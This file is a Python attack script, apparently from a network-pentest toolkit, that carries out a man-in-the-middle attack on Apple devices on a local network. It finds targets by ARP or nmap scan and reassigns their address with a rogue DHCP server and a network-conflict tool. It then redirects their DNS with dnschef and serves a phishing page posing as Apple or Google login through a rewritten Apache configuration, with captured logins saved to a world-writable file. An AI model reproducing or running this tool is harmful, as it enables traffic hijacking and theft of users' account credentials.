#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from scanner import Scanner
from os import path, errno, makedirs
from shutil import copyfile, copytree
import subprocess as sub
from argparse import ArgumentParser
from sys import exit
from time import sleep, time
from ipaddress import IPv4Address
import re
# endregion

# region Check user, platform and print banner
Base = Base()
Scanner = Scanner()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Apple DHCP MiTM script')
parser.add_argument('-i', '--listen_iface', type=str, help='Set interface name for send DHCPACK packets')
parser.add_argument('-f', '--fishing_domain', type=str, default="auth.apple.wi-fi.com",
                    help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
parser.add_argument('-p', '--fishing_domain_path', type=str, default="apple",
                    help='Set local path to domain name for social engineering (default="apple")')
parser.add_argument('-k', '--kill', action='store_true', help='Kill process')
parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
args = parser.parse_args()
# endregion

# region Kill subprocess
sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep | awk '{print $2}') 2>/dev/null"],
          shell=True)
sub.Popen(["kill -9 $(ps aux | grep dnschef | grep -v grep | awk '{print $2}') 2>/dev/null"],
          shell=True)

# Kill the processes that listens on 53 UDP port
sub.Popen(["kill -9 $(lsof -iUDP -n -P | grep ':53' | awk '{print $2}') 2>/dev/null"],
          shell=True)

if args.kill:
    exit(0)
# endregion

# region Set global variables
apple_devices = []
apple_device = []
localnet_ip_addresses = []
ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
target_ip = None
new_ip = None
# endregion

# region Get listen network interface, your IP address, first and last IP in local network
listen_network_interface = None

if args.listen_iface is None:
    Base.print_warning("Set listen network interface:")
    listen_network_interface = Base.netiface_selection()
else:
    listen_network_interface = args.listen_iface

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

first_ip = Base.get_netiface_first_ip(listen_network_interface)
last_ip = Base.get_netiface_last_ip(listen_network_interface)
# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("First ip address: ", first_ip)
Base.print_info("Last ip address: ", last_ip)
# endregion

# region Check target IP and new IP addresses
if args.target_ip is not None:
    if ip_pattern.match(args.target_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
            target_ip = args.target_ip
            Base.print_info("Target IP address: ", target_ip)
        else:
            Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target IP address: ", args.target_ip)
        exit(1)

if args.new_ip is not None:
    if ip_pattern.match(args.new_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.new_ip)) <= IPv4Address(unicode(last_ip)):
            new_ip = args.new_ip
            Base.print_info("Target new IP address: ", new_ip)
        else:
            Base.print_error("Target new IP address: ", args.new_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target new IP address: ", args.new_ip)
        exit(1)
# endregion

if __name__ == "__main__":

    # region Social engineering

    # Disable ipv4 forwarding
    Base.print_info("Disable ipv4 forwarding")
    ipv4_forward_file_name = "/proc/sys/net/ipv4/ip_forward"
    with open(ipv4_forward_file_name, 'w') as ipv4_forward_file:
        ipv4_forward_file.write("0")

    # Variables
    script_dir = project_root_path
    apache2_sites_available_dir = "/etc/apache2/sites-available/"
    apache2_sites_enabled_dir = "/etc/apache2/sites-enabled/"
    apache2_sites_path = "/var/www/html/"
    redirect_path = apache2_sites_path + "redirect/"

    se_domain = args.fishing_domain
    if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
        se_path = apache2_sites_path + args.fishing_domain_path
    else:
        se_path = args.fishing_domain_path

    Base.print_info("Fishing domain: ", se_domain)
    Base.print_info("Fishing path: ", se_path)

    # Directory for fishing site
    if not path.exists(se_path):
        if args.fishing_domain_path == "google" or args.fishing_domain_path == "apple":
            copytree(src=script_dir + "/Fishing_domains/" + args.fishing_domain_path, dst=se_path)
        else:
            Base.print_error("Directory: ", se_path, " does not exist!")
            exit(1)

    sub.Popen(['chmod 777 ' + se_path + '/logins.txt >/dev/null 2>&1'], shell=True)

    # region Apache2 sites settings
    default_site_file_name = "000-default.conf"
    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
    default_site_file.write("<VirtualHost *:80>\n" +
                            "\tServerAdmin admin@apple.com\n" +
                            "\tRewriteEngine on\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-f\n" +
                            "\tRewriteCond %{REQUEST_FILENAME} !-d\n" +
                            "\tRewriteRule ^(.*)$ /redirect.php?page=$1 [NC]\n" +
                            "\tDocumentRoot " + redirect_path + "\n" +
                            "\t<Directory " + redirect_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n\n" +
                            "<VirtualHost *:80>\n" +
                            "\tServerName " + se_domain + "\n" +
                            "\tServerAdmin admin@" + se_domain + "\n" +
                            "\tDocumentRoot " + se_path + "\n" +
                            "\t<Directory " + se_path + ">\n" +
                            "\t\tOptions FollowSymLinks\n" +
                            "\t\tAllowOverride None\n" +
                            "\t\tOrder allow,deny\n" +
                            "\t\tAllow from all\n" +
                            "\t</Directory>\n" +
                            "</VirtualHost>\n")
    default_site_file.close()

    # Create dir with redirect script
    try:
        makedirs(redirect_path)
    except OSError:
        Base.print_info("Path: ", redirect_path, " already exist.")
    except:
        Base.print_error("Something else went wrong while trying to create path: ", redirect_path)
        exit(1)

    # Copy and change redirect script
    redirect_script_name = "redirect.php"
    redirect_script_src = script_dir + "/Utils/" + redirect_script_name
    redirect_script_dst = redirect_path + redirect_script_name

    copyfile(src=redirect_script_src, dst=redirect_script_dst)

    # Read redirect script
    with open(redirect_script_dst, 'r') as redirect_script:
        content = redirect_script.read()

    # Replace the string
    content = content.replace('change_me', se_domain)

    # Write redirect script
    with open(redirect_script_dst, 'w') as redirect_script:
        redirect_script.write(content)

    try:
        Base.print_info("Restarting apache2 server ...")
        sub.Popen(['a2enmod rewrite  >/dev/null 2>&1'], shell=True)
        sub.Popen(['systemctl restart apache2  >/dev/null 2>&1'], shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "systemctl", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`systemctl reload apache2`")
            exit(2)
    # endregion

    # region Dnschef settings
    try:
        sub.Popen(['dnschef -i ' + your_ip_address + ' --fakeip=' + your_ip_address +
                   ' >' + script_dir + '/dnschef.log 2>&1 &'],
                  shell=True)
    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "dnschef", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something else went wrong while trying to run ", "`dnschef`")
            exit(2)
    # endregion
    # endregion

    # region Find Apple devices in local network with arp-scan or nmap
    if args.target_ip is None:
        if not args.nmap_scan:
            Base.print_info("ARP scan is running ...")
            apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
        else:
            Base.print_info("NMAP scan is running ...")
            apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

        apple_device = Scanner.apple_device_selection(apple_devices)
    # endregion

    # region Find Mac address of Apple device if target IP is set
    if args.target_ip is not None:
        Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
        target_mac = Base.get_mac(listen_network_interface, target_ip)
        if target_mac == "ff:ff:ff:ff:ff:ff":
            Base.print_error("Could not find device MAC address with IP address: ", target_ip)
            exit(1)
        else:
            apple_device = [target_ip, target_mac]
    # endregion

    if len(apple_device) > 0:
        # region Output target IP and MAC address
        Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
        # endregion

        # region Set new IP address for target
        if args.new_ip is None:
            # region Fast scan localnet with arp-scan
            Base.print_info("Search for free IP addresses on the local network ...")
            localnet_ip_addresses = Scanner.find_ip_in_local_network(listen_network_interface)
            # endregion
            index = 0
            while new_ip is None:
                check_ip = str(IPv4Address(unicode(first_ip)) + index)
                if check_ip not in localnet_ip_addresses:
                    new_ip = check_ip
                else:
                    index += 1
            index = 0
        Base.print_info("Target new ip: ", new_ip)
        # endregion

        # region Run apple_rogue_dhcp and network_conflict_creator scripts
        try:
            sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' + listen_network_interface +
                       ' -t ' + apple_device[1] + ' -I ' + new_ip + ' -q &'],
                      shell=True)
            sleep(3)
            sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
                       listen_network_interface + ' -I ' + apple_device[0] + ' -t ' + apple_device[1] +
                       ' -q'], shell=True)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: ", "python", " is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run ",
                                 "`apple_rogue_dhcp.py`", " or ", "`network_conflict_creator.py`")
                exit(2)
        # endregion

        # region Check apple_rogue_dhcp script is run
        try:
            rogue_server_is_run = True
            start = time()
            while rogue_server_is_run:
                if (int(time() - start) > 120):
                    sub.Popen(["kill -9 $(ps aux | grep apple_rogue_dhcp.py | grep -v grep |" +
                               " awk '{print $2}') 2>/dev/null"], shell=True)
                ps = sub.Popen(['ps aux | grep "apple_rogue_dhcp" | grep -v grep'],
                               shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                ps_out, ps_err = ps.communicate()
                if ps_out == "":
                    rogue_server_is_run = False
                else:
                    sleep(5)
        except OSError as e:
            if e.errno == errno.ENOENT:
                Base.print_error("Program: ", "ps", " is not installed!")
                exit(1)
            else:
                Base.print_error("Something else went wrong while trying to run ", "`ps`")
                exit(2)
        # endregion
